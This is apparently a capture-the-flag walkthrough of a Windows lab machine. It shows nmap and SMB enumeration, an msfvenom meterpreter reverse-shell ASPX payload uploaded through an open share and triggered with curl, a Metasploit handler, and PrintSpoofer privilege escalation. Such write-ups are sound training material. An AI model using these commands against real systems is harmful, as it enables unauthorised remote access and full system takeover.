## Enumeration
First we run an nmap scan on the ip given which reveals 2 web servers and smb servers.

Looking at the http website for this there is nothing significant there.
So we can enumerate the smb shares on this server.

`nmap --script=smb-enum-* HOST-IP -oN smb_enum.nmap`

## Recon
We find a peculiar share named `/nt4wrksv` on it.

Logging into it using smbclient: `smbclient //HOST-IP/nt4wrksv` and pasword is blank.

We see a passwords file with base64 encoded passwords in it. I thought this could be useful but it wasn't.

Bit of the dead end here.
So I did a gobuster search on the web server running on port `49663`. We find a directory there called `nt4wrksv`. 
We can access the passwords.txt file on this web server meaning if we upload a reverse shell to this share and trigger it using the web server we can work with something.

## Exploitation
So I made a payload using msfvenom to upload into the share using smbclient.

To get the info on arch google the service info form the nmap scan.

`msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 LHOST=tun0 LPORT=4444 -f aspx -o rev.aspx`

We upload this to nt4wrksv share using the `put` command.
Now we set up a handler on metasploit.

`use exploit/multi/handler    
 set payload windows/x64/meterpreter/reverse_tcp    
 set lhost tun0    
 set lport 4444    
 run    
`

Now that we have this setup we can trigger the rev.aspx either by a curl command or by manually going there in a web browser.

`curl http://HOST-IP:49663/nt4wksv/rev.aspx`

The reason I used a meterpreter shell rather than a normal reverse shell is because I can execute all linux commands on meterpreter and it works on windows server.

We get a meterpreter shell now. We can navigate over to `C:/Users/Bob/` where we have our user.txt file.

## Privilege Escalation
if we see the `whoami /priv` , it will list all privileges accessible for the user Bob.

We can see here that `SeImpersonatePrevilige` is enabled. Hence, we can a use a tool called [printspoofer](https://github.com/dievus/printspoofer) to get root access.

We download this onto our machine and upload through the `upload` command in meterpreter and run this: `PrintSpoofer.exe -i -c cmd`

Now we have root access. We can go to the directory `c:/users/administartor/desktop` and print out the root flag.